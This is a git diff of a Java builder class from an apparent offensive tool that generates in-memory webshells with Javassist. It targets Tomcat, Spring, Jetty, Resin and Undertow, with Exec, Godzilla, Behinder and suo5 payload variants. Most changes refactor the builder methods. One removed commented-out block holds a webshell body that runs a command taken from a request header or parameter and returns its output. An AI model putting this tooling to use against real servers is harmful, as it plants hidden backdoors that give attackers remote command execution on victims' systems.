@@ -6,6 +6,7 @@ import com.ppp.annotation.Builder;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
 import com.ppp.annotation.Middleware;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.maker.CryptoUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
@@ -24,34 +25,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         tomcatListenerResponseMaker(ctClass);
 
-        // run
-//        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
-//        runCtMethod.setBody("{try {\n" +
-//                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
-//                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
-//                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
-//                "    String str = null;\n" +
-//                "    if (header != null) {\n" +
-//                "        str = (String) header;\n" +
-//                "    } else if (param != null) {\n" +
-//                "        str = (String) param;\n" +
-//                "    }\n" +
-//                "    String result = exec(str);\n" +
-//                "    Object response = getResponse(httpServletRequest);\n" +
-//                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
-//                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
-//                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
-//                "} catch (Exception ignored) {\n" +
-////                "    ignored.printStackTrace();\n" +
-//                "}}");
-
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -59,14 +39,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         tomcatListenerResponseMaker(ctClass);
 
         godzillaMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -74,14 +55,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] tomcatListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         tomcatListenerResponseMaker(ctClass);
 
         behinderMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -89,13 +71,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] tomcatListenerSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         tomcatListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -114,97 +96,155 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] tomcatServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] tomcatServletSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] tomcatFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] tomcatFilterSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Executor)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatExecutorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Valve)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatValveExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Valve)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] tomcatValveGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Valve)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] tomcatValveBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Valve)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] tomcatValveSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     /**
@@ -214,22 +254,39 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Controller)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] springControllerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Spring)
     @MemShell(MemShell.Interceptor)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] springInterceptorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Spring)
     @MemShell(MemShell.Interceptor)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] springInterceptorGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        String userInputPath = javaClassHelper.getPATH();
+
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+        javaClassHelper.setPATH(userInputPath);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     /**
@@ -239,13 +296,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] jettyListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         jettyListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -254,14 +311,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] jettyListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         jettyListenerResponseMaker(ctClass);
 
         godzillaMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -269,14 +327,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] jettyListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         jettyListenerResponseMaker(ctClass);
 
         behinderMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -284,13 +343,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] jettyListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         jettyListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -309,13 +368,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] resinListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         resinListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -323,14 +382,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] resinListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         resinListenerResponseMaker(ctClass);
 
         godzillaMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -338,14 +398,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] resinListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         resinListenerResponseMaker(ctClass);
 
         behinderMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -353,13 +414,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] resinListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         resinListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -374,60 +435,97 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] resinServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] resinServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] resinServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] resinServletSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] resinFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] resinFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] resinFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Resin)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] resinFilterSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     /**
@@ -437,43 +535,61 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] undertowServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] undertowServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] undertowServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] undertowServletSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] undertowListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         undertowListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -481,14 +597,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] undertowListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         undertowListenerResponseMaker(ctClass);
 
         godzillaMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -496,14 +613,15 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] undertowListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         undertowListenerResponseMaker(ctClass);
 
         behinderMS(javaClassHelper);
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -511,13 +629,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] undertowListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
         CtClass ctClass = initCtClass(cls);
 
         // response
         undertowListenerResponseMaker(ctClass);
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
         return JavaClassModifier.toBytes(ctClass);
     }
 
@@ -547,30 +665,48 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] undertowFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] undertowFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         godzillaMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Behinder)
     public byte[] undertowFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
         behinderMS(javaClassHelper);
-        return defaultOriginalMS(cls, javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     @Middleware(Middleware.Undertow)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.sou5)
     public byte[] undertowFilterSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        return defaultOriginalMS(cls, javaClassHelper);
+        JavaClassModifier.javaClassHelperInit(javaClassHelper);
+        CtClass ctClass = initCtClass(cls);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+        return JavaClassModifier.toBytes(ctClass);
     }
 
     public static void godzillaMS(JavaClassHelper javaClassHelper) throws Exception {
@@ -592,22 +728,6 @@ public class MSJavaClassBuilder {
         Printer.yellowInfo(String.format("pass: %s", pass));
 //        javaClassHelper.setPass("e45e329feb5d925b");
         javaClassHelper.setPass(CryptoUtils.md5Half(pass));
-    }
-
-    /**
-     * 默认
-     *
-     * @param cls
-     * @param javaClassHelper
-     * @return
-     * @throws Exception
-     */
-    public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
-        CtClass ctClass = initCtClass(cls);
-
-        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
-
-        return JavaClassModifier.toBytes(ctClass);
     }
 
     public static CtClass initCtClass(Class cls) throws Exception {
